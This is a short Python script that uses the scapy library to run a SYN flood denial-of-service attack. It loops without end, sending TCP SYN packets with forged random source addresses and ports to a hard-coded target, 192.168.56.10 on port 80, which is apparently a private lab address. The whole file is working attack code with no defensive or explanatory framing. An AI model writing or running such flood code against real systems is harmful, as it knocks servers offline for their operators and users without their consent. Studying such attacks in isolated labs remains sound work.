from scapy.all import *
import random

def syn_flood(target_ip, target_port):
    print(f"Starting SYN flood on {target_ip}:{target_port} (Ctrl+C to stop)...")
    while True:
        src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags='S', seq=random.randint(1000, 9999))
        packet = ip / tcp
        send(packet, verbose=False)

if __name__ == "__main__":
    print("Starting SYN flood attack...")
    syn_flood("192.168.56.10", 80)

